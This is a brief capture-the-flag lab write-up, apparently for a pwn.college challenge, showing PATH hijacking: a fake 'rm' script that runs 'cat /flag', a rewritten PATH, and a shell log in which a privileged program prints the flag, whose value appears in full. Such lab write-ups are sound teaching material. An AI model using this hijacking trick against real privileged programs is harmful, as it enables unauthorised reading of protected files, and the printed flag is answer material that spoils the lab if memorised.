# Hijacking Commands
- By default, we can't modify or change the content of /challenge/run. So the best we can do is change the working of rm.
- We can make our own rm file which instead of deleting the contents of the file reads it.
- But the problem is after we overwrite PATH we won't be able to use cat to read the contents since it doesn't know where cat is located.
- To solve this I copied to contents of the cat command(got the address by which cat/ command -v cat) to a cat file in home. Also create your own rm file.
- Now store their paths in PATH. Prefer putting their paths first. I also left /run/... just incase this method didn't work I could still use the commands.
- Make sure you remove all the paths that begin with /usr because the program tends to use all the commands(like rm etc) stored in those files and ignores other files.
- Lastly ensure you can execute your cat and rm that you created by modifying its permissions using chmod.
- CONGRATULATIONS its finally over. Run /challenge/run and get the FLAG.
```bash
hacker@path~hijacking-commands:~$ echo "cat /flag" > rm
hacker@path~hijacking-commands:~$ cp /usr/bin/cat cat
hacker@path~hijacking-commands:~$ echo $PATH
/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~hijacking-commands:~$ PATH=/home/hacker:/run/challenge/bin:/run/workspace/bin
hacker@path~hijacking-commands:~$ chmod ug+x rm
hacker@path~hijacking-commands:~$ chmod ug+x cat
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{oV2IP0A6HY7njp5K1qMc-rT8mxV.ddzNyUDL0gTN0czW}
```
